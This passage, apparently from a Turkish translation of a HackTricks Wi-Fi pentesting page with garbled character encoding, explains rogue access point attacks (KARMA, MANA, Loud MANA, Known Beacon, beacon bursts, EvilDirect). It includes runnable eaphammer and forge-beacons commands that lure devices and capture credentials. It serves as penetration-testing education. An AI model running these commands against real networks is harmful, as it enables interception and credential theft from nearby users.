2. **MAC tabanlÄ± Kara Liste**:
* Sahte AP, kara listedeki cihazlardan gelen sorgularÄ± yok sayacak ve bu belirli cihazlar iÃ§in sahte AP'yi gÃ¶rÃ¼nmez hale getirecektir.
3. **ESSID tabanlÄ± Beyaz Liste**:
* Sahte AP, yalnÄ±zca belirli ESSID'ler listelenen sorgulara yanÄ±t verecek ve bu ESSID'leri Tercih Edilen AÄŸ Listelerinde (PNLs) bulunmayan cihazlar iÃ§in gÃ¶rÃ¼nmez hale getirecektir.
4. **ESSID tabanlÄ± Kara Liste**:
* Sahte AP, kara listedeki belirli ESSID'ler iÃ§in sorgulara yanÄ±t vermeyecek ve bu Ã¶zel aÄŸlarÄ± arayan cihazlar iÃ§in gÃ¶rÃ¼nmez hale gelecektir.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Bu yÃ¶ntem, **cihazlarÄ±n aÄŸlara baÄŸlanmaya Ã§alÄ±ÅŸÄ±rken tÃ¼m probe isteklerine yanÄ±t veren kÃ¶tÃ¼ niyetli bir eriÅŸim noktasÄ± (AP) oluÅŸturmasÄ±na olanak tanÄ±r**. Bu teknik, cihazlarÄ±, aradÄ±klarÄ± aÄŸlarÄ± taklit ederek bir saldÄ±rganÄ±n AP'sine baÄŸlanmaya kandÄ±rÄ±r. Bir cihaz bu sahte AP'ye baÄŸlantÄ± isteÄŸi gÃ¶nderdiÄŸinde, baÄŸlantÄ±yÄ± tamamlar ve cihazÄ±n yanlÄ±ÅŸlÄ±kla saldÄ±rganÄ±n aÄŸÄ±na baÄŸlanmasÄ±na neden olur.

### MANA

ArdÄ±ndan, **cihazlar istenmeyen aÄŸ yanÄ±tlarÄ±nÄ± gÃ¶rmezden gelmeye baÅŸladÄ±**, bu da orijinal karma saldÄ±rÄ±sÄ±nÄ±n etkinliÄŸini azalttÄ±. Bununla birlikte, Ian de Villiers ve Dominic White tarafÄ±ndan tanÄ±tÄ±lan **MANA saldÄ±rÄ±sÄ±** adÄ± verilen yeni bir yÃ¶ntem ortaya Ã§Ä±ktÄ±. Bu yÃ¶ntem, cihazlarÄ±n yayÄ±n probe isteklerine yanÄ±t vererek cihazlardan Tercih Edilen AÄŸ Listelerini (PNL) yakalamayÄ± iÃ§erir. Cihazlar tarafÄ±ndan daha Ã¶nce istenilen aÄŸ adlarÄ±nÄ± (SSID'ler) taklit ederek, bu sofistike saldÄ±rÄ±, cihazlarÄ±n bilinen aÄŸlarÄ± hatÄ±rlama ve Ã¶nceliklendirme ÅŸeklini istismar ederek orijinal karma saldÄ±rÄ±sÄ±na karÅŸÄ± korumalarÄ± atlar.

MANA saldÄ±rÄ±sÄ±, cihazlardan hem yÃ¶nlendirilmiÅŸ hem de yayÄ±nlanmÄ±ÅŸ probe isteklerini izleyerek Ã§alÄ±ÅŸÄ±r. YÃ¶nlendirilmiÅŸ istekler iÃ§in, cihazÄ±n MAC adresini ve istenen aÄŸ adÄ±nÄ± kaydeder ve bu bilgiyi bir listeye ekler. Bir yayÄ±n isteÄŸi alÄ±ndÄ±ÄŸÄ±nda, AP, cihazÄ±n listesindeki herhangi bir aÄŸla eÅŸleÅŸen bilgilerle yanÄ±t verir ve cihazÄ± sahte AP'ye baÄŸlanmaya teÅŸvik eder.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### YÃ¼ksek Sesli MANA

**YÃ¼ksek Sesli MANA saldÄ±rÄ±sÄ±**, cihazlarÄ±n yÃ¶nlendirilmiÅŸ sorgulama kullanmadÄ±ÄŸÄ±nda veya Tercih Edilen AÄŸ Listeleri (PNL) saldÄ±rgan tarafÄ±ndan bilinmediÄŸinde kullanÄ±lan geliÅŸmiÅŸ bir stratejidir. Bu saldÄ±rÄ±, **aynÄ± bÃ¶lgedeki cihazlarÄ±n PNL'lerinde bazÄ± aÄŸ adlarÄ±nÄ± paylaÅŸma olasÄ±lÄ±ÄŸÄ± Ã¼zerine Ã§alÄ±ÅŸÄ±r**. SeÃ§ici olarak yanÄ±t vermek yerine, bu saldÄ±rÄ±, gÃ¶zlemlenen tÃ¼m cihazlarÄ±n birleÅŸik PNL'lerinde bulunan her aÄŸ adÄ± (ESSID) iÃ§in sorgu yanÄ±tlarÄ± yayÄ±nlar. Bu geniÅŸ yaklaÅŸÄ±m, bir cihazÄ±n tanÄ±dÄ±k bir aÄŸÄ± tanÄ±ma ve sahte EriÅŸim NoktasÄ±na (AP) baÄŸlanmaya Ã§alÄ±ÅŸma olasÄ±lÄ±ÄŸÄ±nÄ± artÄ±rÄ±r.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Bilinen Beacon saldÄ±rÄ±sÄ±

**YÃ¼ksek Sesli MANA saldÄ±rÄ±sÄ±** yeterli olmadÄ±ÄŸÄ±nda, **Bilinen Beacon saldÄ±rÄ±sÄ±** baÅŸka bir yaklaÅŸÄ±m sunar. Bu yÃ¶ntem, bir kelime listesinden tÃ¼retilen potansiyel ESSID'leri dÃ¶ngÃ¼sel olarak yanÄ±tlayan bir AP'yi simÃ¼le ederek baÄŸlantÄ± sÃ¼recini zorlar. Bu, birÃ§ok aÄŸÄ±n varlÄ±ÄŸÄ±nÄ± simÃ¼le eder ve kurbanÄ±n PNL'sindeki bir ESSID ile eÅŸleÅŸmeyi umarak sahte AP'ye baÄŸlantÄ± denemesine neden olur. SaldÄ±rÄ±, cihazlarÄ± tuzaklamak iÃ§in daha agresif bir deneme iÃ§in `--loud` seÃ§eneÄŸi ile birleÅŸtirilerek artÄ±rÄ±labilir.

Eaphammer, bu saldÄ±rÄ±yÄ± tÃ¼m ESSID'lerin bir listesi iÃ§inde ÅŸarj edildiÄŸi bir MANA saldÄ±rÄ±sÄ± olarak uygulamÄ±ÅŸtÄ±r (bu ayrÄ±ca `--loud` ile birleÅŸtirilerek YÃ¼ksek Sesli MANA + Bilinen beacon saldÄ±rÄ±sÄ± oluÅŸturulabilir):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Bilinen Beacon Burst saldÄ±rÄ±sÄ±**

**Bilinen Beacon Burst saldÄ±rÄ±sÄ±**, her ESSID'nin listelendiÄŸi bir dosya iÃ§in **beacon Ã§erÃ§evelerinin hÄ±zlÄ± bir ÅŸekilde yayÄ±nlanmasÄ±nÄ±** iÃ§erir. Bu, sahte aÄŸlarÄ±n yoÄŸun bir ortamÄ±nÄ± oluÅŸturarak, Ã¶zellikle MANA saldÄ±rÄ±sÄ± ile birleÅŸtirildiÄŸinde cihazlarÄ±n sahte AP'ye baÄŸlanma olasÄ±lÄ±ÄŸÄ±nÄ± bÃ¼yÃ¼k Ã¶lÃ§Ã¼de artÄ±rÄ±r. Bu teknik, cihazlarÄ±n aÄŸ seÃ§im mekanizmalarÄ±nÄ± aÅŸÄ±rÄ± yÃ¼klemek iÃ§in hÄ±z ve hacmi kullanÄ±r.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct**, geleneksel kablosuz eriÅŸim noktasÄ±na ihtiyaÃ§ duymadan cihazlarÄ±n doÄŸrudan Wi-Fi kullanarak birbirleriyle baÄŸlantÄ± kurmasÄ±nÄ± saÄŸlayan bir protokoldÃ¼r. Bu yetenek, yazÄ±cÄ±lar ve televizyonlar gibi Ã§eÅŸitli Nesnelerin Ä°nterneti (IoT) cihazlarÄ±na entegre edilmiÅŸ olup, doÄŸrudan cihazdan cihaza iletiÅŸimi kolaylaÅŸtÄ±rÄ±r. Wi-Fi Direct'in dikkate deÄŸer bir Ã¶zelliÄŸi, baÄŸlantÄ±yÄ± yÃ¶netmek iÃ§in bir cihazÄ±n eriÅŸim noktasÄ± rolÃ¼nÃ¼ Ã¼stlenmesidir ve bu cihaz grup sahibi olarak bilinir.

Wi-Fi Direct baÄŸlantÄ±larÄ± iÃ§in gÃ¼venlik, **Wi-Fi Protected Setup (WPS)** aracÄ±lÄ±ÄŸÄ±yla saÄŸlanÄ±r ve gÃ¼venli eÅŸleÅŸtirme iÃ§in Ã§eÅŸitli yÃ¶ntemleri destekler, bunlar arasÄ±nda:

* **Push-Button Configuration (PBC)**
* **PIN giriÅŸi**
* **YakÄ±n Alan Ä°letiÅŸimi (NFC)**

Bu yÃ¶ntemler, Ã¶zellikle PIN giriÅŸi, geleneksel Wi-Fi aÄŸlarÄ±nda WPS ile aynÄ± zayÄ±flÄ±klara karÅŸÄ± hassastÄ±r ve benzer saldÄ±rÄ± vektÃ¶rlerinin hedefi olabilir.

### EvilDirect Hijacking

**EvilDirect Hijacking**, Wi-Fi Direct'e Ã¶zgÃ¼ bir saldÄ±rÄ±dÄ±r. Bu, bir Evil Twin saldÄ±rÄ±sÄ±nÄ±n kavramÄ±nÄ± yansÄ±tÄ±r ancak Wi-Fi Direct baÄŸlantÄ±larÄ±nÄ± hedef alÄ±r. Bu senaryoda, saldÄ±rgan, cihazlarÄ± kÃ¶tÃ¼ niyetli bir varlÄ±kla baÄŸlantÄ± kurmaya ikna etmek amacÄ±yla meÅŸru bir grup sahibini taklit eder. Bu yÃ¶ntem, `airbase-ng` gibi araÃ§lar kullanÄ±larak, taklit edilen cihazÄ±n kanalÄ±nÄ±, ESSID'sini ve MAC adresini belirterek gerÃ§ekleÅŸtirilebilir:

## Referanslar

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)'a gÃ¶z atÄ±n (facebook ile giriÅŸ ve captive portalarda WPA taklit)

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±larak deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurun!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±lÄ±klarÄ±nÄ± ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'Ä± takip edin.
* Hacking hilelerinizi gÃ¶ndererek **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek hacking hilelerinizi paylaÅŸÄ±n.

</details>
